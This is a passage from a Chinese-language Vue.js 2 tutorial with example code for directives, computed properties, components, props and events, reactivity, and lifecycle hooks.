computed --&gt; &lt;!-- ↓ 循環尚有庫存的產品 --&gt; &lt;li class=\"btn\" v-for=\"mantou in inStock\"&gt;{{ mantou.name }}&lt;/li&gt;&lt;/ul&gt; 12345678computed: { // ↓ 產生庫存商品列表 inStock: function () { return this.mantous.filter(function (item) { return item.quantity }) }} 🚀 Codepen：點這裡 現在v-for只需要迭代 inStock 清單中的資料，而不是整個產品列表。 而 computed 具有緩存的特性，所以即便有 3 份販售中的清單，v-if實際上也只需要判斷一次。 另外一種情況 除了剛剛所說的以外，還有一種情況是，先用 v-if 判斷是否要顯示，在進行 v-for 循環。 如果是這種情況的話，可以把 v-if 寫在 外層元素 或 &lt;template&gt; 來判斷，要循環的元素寫在內層。 12345&lt;h2 class=\"title\"&gt;販售中&lt;/h2&gt;&lt;!-- 列表中有清單時才執行內部的循環 --&gt;&lt;ul class=\"list\" v-if=\"mantous.length\"&gt; &lt;li class=\"btn\" v-for=\"mantou in mantous\"&gt;{{ mantou.name }}&lt;/li&gt;&lt;/ul&gt; 想想看，如果把 v-if 寫在 &lt;li&gt; 的話，會變什麼樣子？ 答案是會執行 v-for，接著執行 v-if。 因為 v-for 的優先權比 v-if 高，所以即便沒有資料， v-for 還是會先執行，接著才執行 v-if。 v-on 事件綁定透過v-on可以綁定事件到一個元素上，並設定一個處理事件的 function 1234567&lt;div id=\"app\"&gt; &lt;!-- ↓ 寫入 counter 的值 --&gt; &lt;p&gt;Count: &lt;span&gt;{{ counter }}&lt;/span&gt;&lt;/p&gt; &lt;!-- ↓ 在 button 上綁定 click 事件 --&gt; &lt;!-- ↓ 執行 addNumber 函式 --&gt; &lt;button v-on:click=\"addNumber\"&gt;點我RRRRRR&lt;/button&gt;&lt;/div&gt; 12345678910111213let app = new Vue({ el: '#app', data: { counter: 0 }, methods: { addNumber: function () { this.counter++ } }}) 有一件很重要的事情是，在我們的原始碼當中，並沒有對 DOM 做任何更新內容的操作。 這部分 Vue 都幫我們直接處理好了，所以現在我們只需要專注在程式的層面上。 💡 註：此處的this指向的是 app 這個 Vue 的物件實體。 縮寫v-系列的相關指令其實都有一套縮寫的寫法。 v-bind縮寫 12345678&lt;!-- ↓ 完整語法 --&gt;&lt;a v-bind:href=\"url\"&gt;...&lt;/a&gt;&lt;!-- ↓ 縮寫 --&gt;&lt;a :href=\"url\"&gt;...&lt;/a&gt;&lt;!-- ↓ 動態參數的縮寫 --&gt;&lt;a :[key]=\"url\"&gt;...&lt;/a&gt; v-on縮寫 12345678&lt;!-- ↓ 完整語法 --&gt;&lt;button v-on:click=\"doSomething\"&gt;Click Me&lt;/button&gt;&lt;!-- ↓ 縮寫 --&gt;&lt;button @click=\"doSomething\"&gt;Click Me&lt;/button&gt;&lt;!-- ↓ 動態參數的縮寫 --&gt;&lt;button @[event]=\"doSomething\"&gt;Click Me&lt;/button&gt; v-cloak如果沒用這個屬性的話，你可能就會在網頁載入時看到 {{ msg }} 之類的變數。 要避免這個情況只需要加上v-cloak這個屬性跟一點點 CSS 即可解決。 123&lt;div id=\"app\"&gt; &lt;p&gt;{{ msg }}&lt;/p&gt;&lt;/div&gt; 123[v-cloak] { display: none;} v-model 雙向綁定透過v-model可以讓資料是雙向綁定的狀態，意思是指 data 跟 元素 的值會是相通的。 123456&lt;div id=\"app\"&gt; &lt;!-- ↓ 把 input 的值跟 message 的值綁在一起 --&gt; &lt;input type=\"text\" v-model=\"message\" /&gt; &lt;!-- ↓ 顯示 message 的值 --&gt; &lt;p&gt;{{ message }}&lt;/p&gt;&lt;/div&gt; 1234567let app = new Vue({ el: '#app', data: { message: '' }}) 所以你能看到，當 &lt;input&gt; 的值改變時，message 的值會跟著改變，導致&lt;p&gt;的文字跟著改變。 背後的原理其實v-model只是幫你做了兩件事情： 在元素上綁定 v-bind:value 當input事件發生時，更改 Vue 中的資料值 所以前面的範例等同於： 1234567&lt;div id=\"app\"&gt; &lt;!-- ↓ 把 value 屬性綁定到 Vue中的 message --&gt; &lt;!-- ↓ 監聽 input 事件 --&gt; &lt;input type=\"text\" v-bind:value=\"message\" v-on:input=\"changeMessage\" /&gt; &lt;!-- ↓ 顯示 message 的值 --&gt; &lt;p&gt;{{ message }}&lt;/p&gt;&lt;/div&gt; 123456789101112131415let vm = new Vue({ el: '#app', data: { // ↓ 初始值設為空字串 message: '' }, methods: { // ↓ input事件發生時的處理函式 changeMessage: function () { // ↓ 透過 event 取出 input 的值 // ↓ 將 message 的值更新 this.message = event.target.value } }}) 所以v-model就是個 :value + @input 的語法糖，能夠幫你剩下了一些功夫。但試著了解它在背後做了什麼也是很重要的。 computed 計算屬性雖然在{{ }}中可以直接帶入表達式來產出想要的資料，但常常在裡面做很複雜的運算並不是一件好事吧？ 1234567let vm = new Vue({ el: '#app', data: { firstName: '煉獄', lastName: '杏壽郎' }}) 1&lt;p&gt;{{firstName + '．' + lastName}}&lt;/p&gt; 💡 註：圖片來源 如果我們想要秀出好幾個大哥的名字，那就得一直做重複的運算，顯然不是件好事。 為了避免這種重複計算的事情發生，可以使用computed屬性來改善這個問題。 123456789101112131415let vm = new Vue({ el: '#app', data: { firstName: '煉獄', lastName: '杏壽郎' }, // ↓ 使用 computed 屬性 computed: { // ↓ 把運算結果給緩存 fullName: function () { return this.firstName + '．' + this.lastName } }}) 現在你想秀幾個大哥的名稱都沒問題囉！ 12345&lt;p&gt;{{ fullName }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt; 這樣子的好處並不只是看起來比較簡潔而已，而是computed屬性具有緩存的作用。 剛剛設置的fullName，是藉由firstName跟lastName來求出最後的值，所以這兩個值都沒有改變的話，fullName值是不會改變的，也就是說，fullName不需要重新計算來求值，這也就是緩存的用意。 computed 與 methods前面的範例也能改用 methods 來做出一樣的結果，不過 methods 與 computed 最大的差異在於： 呼叫 methods 幾次，函式就會執行幾次 當 computed 依賴的屬性沒有發生改變時，不管呼叫幾次 computed，函式都只會執行一次。 123456789101112131415161718192021let vm = new Vue({ el: '#app', data: { firstName: '煉獄', lastName: '杏壽郎' }, // ↓ 用 methods 來計算大哥的全名 methods: { getfullName: function () { console.log('執行getfullName') return `${this.firstName}．${this.lastName}` } }, // ↓ 用 computed 來緩存大哥的全名 computed: { fullName: function () { console.log('執行fullName') return `${this.firstName}．${this.lastName}` } }}) 123456&lt;p&gt;{{ getfullName() }}&lt;/p&gt;&lt;p&gt;{{ getfullName() }}&lt;/p&gt;&lt;p&gt;{{ getfullName() }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt; console中印證了我們剛剛所說的，我們呼叫了getfullName()3 次，故函式執行了 3 次，而fullName只有執行一次，因為firstName跟lastName都沒有發生改變。 getter 與 settercomputed 還可以細分為 getter(讀取) 與 setter(寫入)這兩種功能。 在沒有特別設定時，預設只會有getter的功能，也就是只能讀取，不能寫入。 如圖所示，我們只能透過修改 firstName 或 lastName 來更新 fullName 的值，而不是直接修改 fullName 。 在前面的範例中我們都透過 computed 來讀取資料，但前面使用的是省略的寫法，完整的寫法如下。 1234567891011121314151617let vm = new Vue({ el: '#app', data: { firstName: '煉獄', lastName: '杏壽郎' }, computed: { fullName: { // ↓ 設定 getter get: function () { // ↓ 讀取大哥的全名 return this.firstName + '．' + this.lastName } } }}) 如果要使用setter的功能，就要像下面這樣子寫。 12&lt;!-- ↓ 把 input 的值跟 fullName 綁在一起 --&gt;&lt;input type=\"text\" v-model=\"fullName\" /&gt; 12345678910111213141516171819let vm = new Vue({ el: '#app', data: { firstName: '煉獄', lastName: '杏壽郎' }, computed: { fullName: { get: function () { return this.firstName + '．' + this.lastName }, // ↓ 設定 setter 方法 set: function (newValue) { console.log('觸發setter') } } }}) 現在我們用v-model強制把 input 跟 fullName 的值綁在一起，所以當 input值改變時，就會去變更 fullName的值，這個時候就會觸發我們在set 函式中所做的設定。 你可能會有個疑問，我們不是修改了fullName的值嗎？fullName的資料怎麼沒有更新？ 這是因為在set函式中，並沒有會觸發get的設定。 既然get沒有被觸發的話，fullName的值就不會被重新計算，而畫面也自然不會重新渲染。 那要怎麼讓get觸發？我們只要在set中做會觸發get的事情就可以了。 123456789101112131415161718192021222324252627282930let vm = new Vue({ el: '#app', data: { firstName: '煉獄', lastName: '杏壽郎' }, computed: { fullName: { // getter get: function () { console.log('觸發getter') return this.firstName + ' ' + this.lastName }, // setter set: function (newValue) { console.log('觸發setter') // ↓ newValue 參數為 input 的值 let names = newValue.split(' ') // ↓ 更新 firsName 的值 this.firstName = names[0] // ↓ 更新 lastName 的值 this.lastName = names[names.length - 1] } } }, // ↓ 畫面重新渲染時會觸發的函式 updated() { console.log('重新渲染畫面') }}) 現在當set觸發時，我們修改 firstName 與 lastName 的值，這個時候就會觸發 get 去重新計算 fullName 的值，並且重新渲染畫面。 所以順序是這樣子的： set → get → updated 要注意的重點是： 什麼時候會觸發 get？當firstName與 lastName 變更時。（前提是模板中有用到 computed 設定的 fullName 屬性） 什麼時候會觸發 set？當fullName變更時。(v-model綁定值) 什麼時候會重新渲染畫面？當模板中的資料（此處的話是fullName）更新時。 所以做個總結： get 與 set 兩者是獨立的，並不是 觸發 set 就會觸發 get。 要觸發get的前提條件是，模板中有使用到其 computed 的屬性。 自定義組件在 Vue 中可以透過建立一個 instance (實體) 來創造自己的 component (組件)。 格式：Vue.component(name, {}) 第一個參數為 String，代表 component 的名稱。 第二個參數為選項 Object，用來對組件做設定。 💡 註 ：組件就跟 new Vue 一樣，可以有 data、computed、watch、methods及 hook function等。 1234567891011121314151617181920212223242526// ↓ 建立一個新的 component// ↓ 第一個參數為 \"組件名稱\"// ↓ 第二個參數為 \"選項物件\"Vue.component('counter', { // ↓ 設定 \"樣板\" 中的內容 // ↓ 這個寫法稱為 字串模板 (String template) template: '&lt;button v-on:click=\"addOne\"&gt;{{ count }}&lt;/button&gt;', // ↓ 組件自己的 data // ↓ 必須用 function + return 物件的方式來設定 data() { return { count: 0 } }, // ↓ 函式則是一樣使用 property 來設定 methods: { addOne: function () { this.count++ } }})let app = new Vue({ el: '#app'}) 接著就能在 HTML 中使用剛剛自定義的組件名稱來作為 tag 12345678910&lt;div id=\"app\"&gt; &lt;ul&gt; &lt;!-- ↓ 拿我們在 Vue建立的 Component 來使用 --&gt; &lt;counter&gt;&lt;/counter&gt; &lt;counter&gt;&lt;/counter&gt; &lt;counter&gt;&lt;/counter&gt; &lt;counter&gt;&lt;/counter&gt; &lt;counter&gt;&lt;/counter&gt; &lt;/ul&gt;&lt;/div&gt; 可以注意到每個組件都是一個獨立存在的 instance (實體)，所以並不會被彼此給干擾。 💡 註 ：一個組件只能有一個根元素，也就是說如果你的組件為巢狀結構，請在最外層以一個&lt;div&gt;來包裹住整個組件的內容。 組件的命名在對組件命名時，建議都以 kebab-case (連字符號) 的方式來命名。 如果使用 camelCase (pascalCase) 的話，在 HTML 中也必須要轉換成 kebab-case 的格式才有辦法使用： 12345678910111213// ↓ kebab-caseVue.component('component-a', { template: ` &lt;div&gt;kebab-case compoent&lt;/div&gt; `})// ↓ camelCase (PascalCase)Vue.component('componentB', { template: ` &lt;div&gt;camelCase compoent&lt;/div&gt; `}) 12345&lt;component-a&gt;&lt;/component-a&gt;&lt;!-- ↓ 必須轉換成 kebab-case --&gt;&lt;component-b&gt;&lt;/component-b&gt;&lt;!-- ↓ 使用 camelCase 的標籤無效 --&gt;&lt;componentB&gt;&lt;/componentB&gt; 🚀 Codepen：點這裡 全域組件與區域組件前面我們用 Vue.component() 來註冊的組件都稱為 全域組件。 全域組件可以被任何 new Vue 建立的 Vue實體 來使用，還有組件中的子組件也可以使用。 而區域組件是在一個實體中透過 components 屬性來建立，並且只有這個實體自己能夠使用。 全域註冊123456789101112131415161718192021222324// ↓ 全域組件 AVue.component('component-a', { template: ` &lt;div class=\"component component--a\"&gt; &lt;h2&gt;組件A&lt;/h2&gt; &lt;p&gt;組件A的文字&lt;/p&gt; &lt;/div&gt;`})// ↓ 全域組件 BVue.component('component-b', { // ↓ 在 組件B 中使用 組件A template: ` &lt;div class=\"component\"&gt; &lt;h2&gt;組件B&lt;/h2&gt; &lt;p&gt;在組件B中使用組件A&lt;/p&gt; &lt;component-a&gt;&lt;/component-a&gt; &lt;/div&gt;`})// ↓ new Vue 實體let vm = new Vue({ el: '#app'}) 🚀 Codepen：點這裡 全域組件在整個 Vue.js 的應用程式中都可以使用，不只是new Vue實體，甚至連在其他組件中也能使用。 區域註冊全域組件有一個很大的缺點是，不管這個組件有沒有被使用，都會被載入。 所以如果是給特定的實體使用的話，可以改用區域註冊的方式來建立組件。 123456789101112131415161718192021222324let vm = new Vue({ el: '#app', // ↓ 在實體中使用 components 屬性 // ↓ 來註冊區域組件 components: { 'component-a': { template: ` &lt;div class=\"component component--a\"&gt; &lt;h2&gt;區域組件A&lt;/h2&gt; &lt;p&gt;區域組件A的文字&lt;/p&gt; &lt;/div&gt;` }, // ↓ 在 組件B 中使用 組件A 'component-b': { template: ` &lt;div class=\"component\"&gt; &lt;h2&gt;區域組件B&lt;/h2&gt; &lt;p&gt;這裡無法使用區域組件A&lt;/p&gt; &lt;component-a&gt;&lt;/component-a&gt; &lt;/div&gt;` } }}) 🚀 Codepen：點這裡 可以看到 組件B 中沒辦法使用 組件A，此處的 組件A 會被直接渲染成一個沒有內容的標籤，而 Vue 也會在 console 報錯。 如果要在 組件B 中使用 組件A，只能在 組件B 這個實體下在註冊一個區域組件，才有辦法達成。 💡 註 ：每個組件都可以視為是一個獨立的實體。 12345678910111213141516171819202122232425262728let vm = new Vue({ el: '#app', // ↓ 在 new Vue實體中使用 components 屬性 // ↓ 來註冊區域組件 components: { 'component-b': { template: ` &lt;div class=\"component\"&gt; &lt;h2&gt;區域組件B&lt;/h2&gt; &lt;p&gt;在此處使用組件A&lt;/p&gt; &lt;component-a&gt;&lt;/component-a&gt; &lt;/div&gt;`, // 在 組件B 實體中使用 components 屬性 // 來註冊組件A components: { 'component-a': { template: ` &lt;div class=\"component component--a\"&gt; &lt;h2&gt;區域組件A&lt;/h2&gt; &lt;p&gt;區域組件A的文字&lt;/p&gt; &lt;/div&gt;` } } } }}) 🚀 Codepen：點這裡 這樣子就能順利在 組件B 中使用 組件A 囉。 父子組件間的資料傳輸因為父組件跟子組件是屬於不同的實體，所以子組件沒辦法直接去使用父組件的方法，也不能修改父組件中的資料。 要讓父子之間做溝通，必須使用 props屬性 及 $emit方法才有辦法達成。 有一句口訣是這樣子： Props down, Events up (props下去，event上來)。 如同下面這張圖所示： 將父組件的資料 props 到子組件中這裡直接舉例子來說明。 為了要在子組件中取得父組件的 msg，我們會建立一個 props 用來把資料給傳遞下去。 123456789101112131415161718192021222324Vue.component('my-component', { template: ` &lt;div class=\"component\"&gt; &lt;p&gt;組件自己的資料：{{ msg }} &lt;/p&gt; &lt;p&gt;從父元件傳遞進來的資料： {{ parentMsg }}&lt;/p&gt; &lt;/div&gt;`, // ↓ 用來把父元件的資料傳遞到子組件 props: ['parentMsg'], // ↓ 組件自己的資料 data() { return { msg: 'Hello' } }})let app = new Vue({ el: '#app', // ↓ 父組件的資料 data: { msg: 'Parent' }}) 接著在子組件設定完 props後，必須使用 v-bind 來把父組件中的資料綁定給子組件。 💡 註：HTML 的屬性沒有大小寫敏感(Case-insensitive)的特性，所以如果props是以(Camel-case)駝峰式的寫法來命名，那麼在 HTML 中則必須使用Kebab-case (連字符號)來表示 props 所定義的屬性 1234&lt;div id=\"app\"&gt; &lt;!-- ↓ 把父元件的 msg 綁定到子組件上 --&gt; &lt;my-component v-bind:parent-msg=\"msg\"&gt;&lt;/my-component&gt;&lt;/div&gt; 🚀 Codepen：點這裡 這樣子就成功把父組件的資料傳遞給子組件囉。 這裡提供一種記憶方式，你可以把 props 想成是 宣告一個變數，而 v-bind 可以想成是在給變數 賦值。 當需要傳入很多資料到組件中時假設我們有一個文章的組件，長的像這樣子。 🚀 Codepen：點這裡 而組件的結構如下： 12345678910111213141516&lt;div id=\"app\"&gt; &lt;div class=\"wrap\"&gt; &lt;!-- ↓ 文章組件 --&gt; &lt;blog-post v-for=\"post in posts\" v-bind:title=\"post.title\" v-bind:content=\"post.content\" v-bind:img=\"post.img\" :key=\"post.id\" &gt;&lt;/blog-post&gt; &lt;!-- ↑ 在組件中傳入資料 --&gt; &lt;!-- 1. 標題 --&gt; &lt;!-- 2. 內容 --&gt; &lt;!-- 3. 圖片 --&gt; &lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627let vm = new Vue({ el: '#app', data: { // ↓ 每篇文章的資料 posts: [ { id: 1, title: '...', content: '...', img: '...' }, { id: 2, title: '...', content: '...', img: '...' }, { id: 3, title: '...', content: '...', img: '...' }, { id: 4, title: '...', content: '...', img: '...' }, { id: 5, title: '...', content: '...', img: '...' } ] }, components: { // ↓ 文章組件的設定 'blog-post': { template: ` &lt;div&gt; &lt;img v-bind:src=\"img\"&gt; &lt;h2&gt;{{ title }}&lt;/h2&gt; &lt;p&gt;{{ content }}&lt;/p&gt; &lt;/div&gt; `, // ↓ 設定要傳入到組件中的資料 props: ['title', 'content', 'img'] } }}) &lt;blog-post&gt;中需要 title (標題)、 content (內容)、 img (圖片) 這些資料，所以我們就得 props 這些資料到組件中。 所以可以看到 props 中需要寫入很多個屬性，以及 HTML 中用了很多 v-bind 來綁定這些 props 。 如果現在想要再添加 date (日期)， comments (留言) 等等的資料， props 跟 HTML 就也得把這些對應的資料給加進去，資料也會變得越來越複雜。 要處裡這種資料很複雜的情況，我們可以稍微修改一下整體的結構，如下： 123456789101112&lt;div id=\"app\"&gt; &lt;div class=\"wrap\"&gt; &lt;!-- ↓ 文章組件 --&gt; &lt;blog-post v-for=\"post in posts\" :key=\"post.id\" v-bind:post=\"post\" &gt;&lt;/blog-post&gt; &lt;!-- ↑ 現在傳入包含整個文章資料的 post --&gt; &lt;!-- ↑ 而不是每一筆資料 --&gt; &lt;/div&gt;&lt;/div&gt; 12345678910111213141516171819202122232425262728let vm = new Vue({ el: '#app', data: { // ↓ 每篇文章的資料 posts: [ { id: 1, title: '...', content: '...', img: '...' }, { id: 2, title: '...', content: '...', img: '...' }, { id: 3, title: '...', content: '...', img: '...' }, { id: 4, title: '...', content: '...', img: '...' }, { id: 5, title: '...', content: '...', img: '...' } ] }, components: { // ↓ 文章組件的設定 'blog-post': { // ↓ 模板中的資料稍微做調整 template: ` &lt;div&gt; &lt;img v-bind:src=\"post.img\"&gt; &lt;h2&gt;{{ post.title }}&lt;/h2&gt; &lt;p&gt;{{ post.content }}&lt;/p&gt; &lt;/div&gt; `, // ↓ 設定要傳入到組件中的資料 props: ['post'] } }}) 寫成這樣子後，在 post 中加入新的資料，都能直接在 &lt;blog-post&gt; 中使用 ，不需要在額外對 props 或 HTML 中加入新的資料。 監聽組件中的事件一樣拿前面的例子來說，假設現在我們想要在組件中添加一個按鈕，這個按鈕能夠用來控制字體大小，像這樣子： 🚀 Codepen：點這裡 該怎麼做呢？ 首先先在 data 中新增一筆用來控制文字大小的 property。 12345678let vm = new Vue({ el: '#app', data: { posts: [...], // ↓ 控制文字大小 postFontSize: 1 },}) 接著在 HTML 新增一個元素，用來控制&lt;blog-post&gt;文字大小。 12345678910&lt;div id=\"app\"&gt; &lt;!-- ↓ 用來設定文字大小的新元素 --&gt; &lt;div :style=\"{fontSize: postFontSize + 'em'}\"&gt; &lt;blog-post v-for=\"post in posts\" v-bind:post=\"post\" :key=\"post.id\" &gt;&lt;/blog-post&gt; &lt;/div&gt;&lt;/div&gt; 接下來在組件的 template 中設置那個控制文字大小的按鈕。 12345678910111213141516171819202122232425let vm = new Vue({ el: '#app', data: { // ... } components: { 'blog-post': { template: ` &lt;div&gt; &lt;img v-bind:src=\"img\"&gt; &lt;h2&gt;{{ post.title }}&lt;/h2&gt; &lt;p&gt;{{ post.content }}&lt;/p&gt; &lt;a href=\"#\"&gt;Read more&lt;/a&gt; // ↓ 那個按鈕 &lt;button&gt;{{ size }}&lt;/button&gt; &lt;/div&gt; `, // ↓ 傳遞 size (文字比例) 給組件 props: ['post', 'size'] } }}) 💡 註 ：這裡希望按鈕能顯示目前的文字的比例，所以 props 一筆資料給組件。 接著只要設定點擊事件就可以了，你可能會想說這樣寫： 1234{ // ↓ 點擊一下，增加 0.1 的大小。 template: `&lt;button v-on:click=\"postFontSize+=0.1\"&gt;{{ size }}&lt;/button&gt;`} 這樣子是沒有作用的。再提醒一次，子組件無法修改父組件的資料。 只有父組件能夠修改 data 中的資料，所以思路要變成 → 讓父組件監聽在子組件中發生的事件，當父組件監聽到內部的事件發生時，再來修改資料。 也就是說要在&lt;blog-post&gt;上設定一個能夠監聽內部子元素的事件。 這要怎麼做到呢？ Vue 提供了一個 自定義事件 的系統，讓我們可以自己建立一種事件，所以可以這樣子設定： 123&lt;!-- ↓ 自定義一個 enlarge-text 事件 --&gt;&lt;!-- ↓ 發生時觸發 changeFontSize 函式--&gt;&lt;blog-post v-on:enlarge-text=\"changeFontSize\"&gt;&lt;/blog-post&gt; 接著要在 template 中的按鈕中定義這個事件。 123456{ // ↓ 點擊時觸發一個 enlargeText 事件 // ↓ $emit方法 會把 enlargeText 事件傳遞給 &lt;blog-post&gt; 觸發 // ↓ 0.1 是要傳遞給 &lt;blog-post&gt; 的資料(參數) template: `&lt;button v-on:click=\"$emit('enlargeText', 0.1)\"&gt;{{ size }}&lt;/button&gt;`} 最後在 data 中的 methods 定義用來處理事件的函式。 123456methods: { // ↓ enlargeAmount = $emit 傳遞過來的資料 (0.1) changeFontSize: function(enlargeAmount) { this.postFontSize += enlargeAmount }} 這樣子就完成了。 雖然看起來有點複雜，但這一大串的目的其實只有一個，讓父元素能夠監聽到按鈕的 click 事件，接著做對應處理，就這麼單純而已。 在組件上使用 v-model再複習一次 v-model 的原理。 123&lt;input v-model=\"text\" /&gt;&lt;!-- ↓ 等同於以下 --&gt;&lt;input v-bind:value=\"text\" v-on:input=\"text = $event\" /&gt; 特別注意一點：v-model 預設綁定的屬性是value，監聽的事件是input。 而我們的最終目標是這樣： 1&lt;my-component v-model=\"text\"&gt;&lt;/my-component&gt; 等於要變成這樣： 1&lt;my-component v-bind:value=\"text\" v-on:input=\"text = $event\"&gt;&lt;/my-component&gt; 也就是說我們必須生出一個 value 屬性讓組件可以 v-bind，以及用來監聽 input 事件的監聽器。 所以，我們得 props 一個叫做 value 的屬性，同時在組件中的子元素拋出一個 input 的自定義事件，如下： 12345678910Vue.component('my-component', { // ↓ 拋出 input 事件 + 當前 input 的值 template: ` &lt;div&gt; &lt;input v-bind:value=\"value\" v-on:input=\"$emit('input', $event.target.value)\"&gt; &lt;/div&gt; `, // ↓ 建立 value 屬性 props: ['value']}) 這樣子組件上的 v-model 就能夠正常運作囉。 🚀 Codepen：點這裡 客製組件的 v-model由於 v-model 是 v-bind:value 及 v-on:input 的語法糖，所以如果要做雙向綁定的元素是 &lt;input&gt; 的話沒什麼問題。 但如果現在要綁的元素變成 radio 或是 checkbox 之類的元素，就無法套用 v-model 的預設值。 這個時候就得對 v-bind 及 v-on 客製化，來讓 v-model 能夠順利運作。 你可以在組件中加上一個 model 的屬性來做設定，如下： 12345678910111213141516171819202122Vue.component('my-checkbox', { template: ` &lt;label&gt; &lt;input type=\"checkbox\" v-bind:checked=\"checkded\" v-on:change=\"$emit('change', $event.target.checked)\" &gt; 客製化v-model &lt;/label&gt; `, props: ['checked'], // ↓ model 屬性 model: { // ↓ 原預設是 v-bind:value // ↓ 客製化為 v-bind:checked prop: 'checked', // ↓ 原預設是 v-on:input // ↓ 客製化為 v-on:change event: 'change' }}) 1234567891011&lt;div class=\"wrap\"&gt; &lt;div id=\"app\"&gt; &lt;!-- ↓ v-model 語法糖 --&gt; &lt;my-checkbox v-model=\"ischecked\"&gt;&lt;/my-checkbox&gt; &lt;!-- ↓ 等於以下 --&gt; &lt;my-checkbox :checked=\"ischecked\" v-on:change=\"ischecked = $event\" &gt;&lt;/my-checkbox&gt; &lt;/div&gt;&lt;/div&gt; 🚀 Codepen：點這裡 Vue 的響應式更新如同前面的示範，當你在 Vue 的data中加入某些資料時，這些資料就會跟 Vue 相依為命。 當資料的值改變時，Vue 中的 data 值也會跟著改變。 當 Vue 中的 data 值改變時，資料的值也會跟著改變。 12345678910111213141516171819202122232425// ↓ 資料let data = { a: 1 }// ↓ 建立 Vue 實體let vm = new Vue({ // ↓ 把資料放入到 data 中 data: data})// ↓ 相親相愛 (true)console.log(vm.a === data.a)// ↓ 更改資料的值data.a = 2// ↓ Vue中的 data 同步更新// ↓ (2)console.log(vm.a)// ↓ 反過來也一樣vm.a = 3// ↓ 資料的值同步更新// ↓ (3)console.log(data.a) 但有一個例外，就是使用了Object.freeze()。 123456&lt;div id=\"app\" class=\"wrap\"&gt; &lt;!-- ↓ 顯示 foo 的值 --&gt; &lt;p class=\"txt\"&gt;{{ foo }}&lt;/p&gt; &lt;!-- ↓ 點擊按鈕時，變更 foo 的值 --&gt; &lt;button @click=\"foo='Fooooooo'\" class=\"btn\"&gt;Change&lt;/button&gt;&lt;/div&gt; 12345678// ↓ 資料let obj = { foo: 'bar' }let vm = new Vue({ el: '#app', // ↓ 把資料放入到 data 中 data: obj}) 在響應式的情況下是這樣子： 但加入 Object.freeze()後，資料的值就無法更新。 123456789101112// ↓ 資料let obj = { foo: 'bar' }// ↓ 封印起來Object.freeze(obj)let vm = new Vue({ el: '#app', // ↓ 把資料放入到 data 中 data: obj}) 💡 註 ：Object.freeze()會把一個物件給凍結住，所以自然就無法在對物件做更改。 生命週期一個 Vue 實體會經過 建立 → 掛載 → 更新 → 銷毀這四個階段，我們把這稱為是一個 Vue 實體的生命週期。 在這每一個階段中，Vue 提供了幾個 callback function，稱作 Hooks function，能夠讓你在不同的階段中，透過這些 Hooks function 來做一些事情。 💡 註：圖片來源 每個階段會觸發的Hooks function如上圖所示，忘記的話就參考這張圖。 beforeCreate：實體在初始化時就會被呼叫，此時還沒有建立實體，所以 Vue 實體中的任何設定（例如：data）都還沒有配置完成。 created：實體建立完成，這個時候除了 $el 以外的配置都已經完成。（$el必須掛載到模板上之後才會配置）。 beforeMount：在實體被掛載到目標元素之前會被呼叫，這時的 $el 還只是個模板，尚未被 Vue 實體渲染成頁面。 mounted：Vue 實體上的配置已經安裝到模板上，這時的 $el 已經藉由 Vue 實體渲染成真正的頁面。 beforeUpdate：當實體中的 data 發生改變，或是執行 vm.$forceUpdate() 時會被呼叫，此時的頁面還沒有被重新渲染。 updated：在頁面被重新渲染後呼叫，此時的頁面已經被渲染成改變後的頁面。 beforeDestroy：在此實體被銷毀之前呼叫，此時的實體還具有完整的功能。 destroyed：在此實體被銷毀後叫用，此時實體中的任何定義（data、methods…等）都已經被解除綁定，代表在這之後的任何操作都沒有用。 我們用以下的例子來做演練： 123&lt;div id=\"app\"&gt; &lt;p&gt;{{ a }}&lt;/p&gt;&lt;/div&gt; 123456let vm = new Vue({ el: '#app', data: { a: 1 }}) beforeCreate 與 created在設定中加上beforeCreate 與 created： 123456789101112131415161718let vm = new Vue({ el: '#app', data: { a: 1 }, beforeCreate() { console.log('Hook beforeCreate') console.log(`試著讀取a的值 : ${this.a}`) console.log(`試著讀取el的值 : ${this.$el}`) console.log(' ') }, created() { console.log('Hook created') console.log(`試著讀取a的值 : ${this.a}`) console.log(`試著讀取el的值 : ${this.$el}`) console.log(' ') }}) 結果如下： 1234567Hook beforeCreate試著讀取a的值 : undefined試著讀取el的值 : undefinedHook created試著讀取a的值 : 1試著讀取el的值 : undefined 🚀 Codepen：點這裡 beforeCreate：此時實體還沒有建立，所以去讀取實體中的資料都會得到 undefined。 created：實體被建立完成後，就可以讀取到 a 的值，而 $el 必須等到掛載時才讀取的到。 所以在 beforeCreate 是不能對實體中的物件做操作的 beforeMount 與 mounted現在加上beforeMount 與 mounted： 123456789101112131415161718let vm = new Vue({ el: '#app', data: { a: 1 }, beforeMount() { console.log('Hook beforeMount') console.log('試著擷取el元素的outerHTML') console.log(this.$el.outerHTML) console.log(' ') }, mounted() { console.log('Hook mounted') console.log('試著擷取el元素的outerHTML') console.log(this.$el.outerHTML) console.log(' ') }}) 結果如下: 123456789Hook beforeMount試著擷取el元素的outerHTML&lt;div id=\"app\"&gt; &lt;p class=\"num\"&gt;{{ a }}&lt;/p&gt;&lt;/div&gt;Hook mounted試著擷取el元素的outerHTML&lt;div id=\"app\"&gt;&lt;p class=\"num\"&gt;1&lt;/p&gt;&lt;/div&gt; 🚀 Codepen：點這裡 beforeMount：流程圖中有提到，實體在掛載到元素上之前，若沒有使用 template 屬性的話，元素（這裡是#app）的 outerHTML 會先被編譯成模板，所以才能夠讀取到 $el 的資料，只是他還沒有被 Vue 實體上的定義給渲染，只是個初始的模板，所以會看到都還是以模板語法的內容 {{ a }} 來呈現。 mounted：實體掛載到元素上之後， 此時的 {{ a }} 已經被 Vue 實體上的定義給渲染，所以會看到顯示的是 1，也就是 a 在實體中的定義。 beforeUpdate 與 updated現在加上beforeUpdate 與 updated 1234567891011121314151617181920let vm = new Vue({ el: '#app', data: { a: 1 }, beforeUpdate() { console.log('Hook beforeUpdate') console.log(`試著擷取a的值：${this.a}`) console.log(`試著擷取el的值：${this.$el}`) console.log(`試著擷取el的outerHTML：${this.$el.outerHTML}`) console.log(' ') }, updated() { console.log('Hook updated') console.log(`試著擷取a的值：${this.a}`) console.log(`試著擷取el的值：${this.$el}`) console.log(`試著擷取el的outerHTML：${this.$el.outerHTML}`) console.log(' ') }}) 